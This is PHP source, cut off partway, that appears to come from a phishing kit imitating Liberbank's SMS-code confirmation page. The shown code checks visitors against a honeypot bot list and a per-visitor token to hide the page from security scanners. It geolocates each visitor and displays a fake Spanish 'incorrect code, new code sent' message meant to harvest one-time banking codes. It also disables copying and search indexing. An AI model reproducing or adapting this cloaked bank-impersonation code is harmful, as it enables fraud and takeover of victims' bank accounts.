<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

include 'M3tri-hash-bots/anti0.php';
/*
include 'M3tri-hash-bots/anti1.php';
include 'M3tri-hash-bots/anti2.php';
include 'M3tri-hash-bots/anti3.php';
include 'M3tri-hash-bots/anti4.php';
include 'M3tri-hash-bots/anti5.php';
include 'M3tri-hash-bots/anti6.php';
include 'M3tri-hash-bots/anti7.php';
include 'M3tri-hash-bots/anti8.php';
include 'M3tri-hash-bots/anti9.php';
*/

$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}



$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl . "?hash=".base64_encode(rand(0,9999999999999)). "&token=" . $_GET['token']); exit;  }

function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 
$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];




$sms_request = $_GET['request'];


if ($sms_request >= '1')
{

$errormsg = "<p><span style='color: red;'>Este código de confirmación es incorrecto, se le ha enviado un mensaje que contiene un nuevo código.</span><br></p>";

}


?>
<!DOCTYPE html> 

<html oncontextmenu="return false;" onselectstart="return false" ondrag="return false" ondrop="return false" onpaste="return false;" oncopy="return false;" oncut="return false;">

<head>


<meta charset="utf-8">
	
	
	<title>Liberbank - sms</title>
	
	<meta http-equiv="Expires" content="-1">
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">


	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta name="format-detection" content="telephone=no">
	

<link rel="stylesheet" type="text/css" href="./LB-files/style.css"><link rel="icon" type="image/png" href="data:image/png;base64,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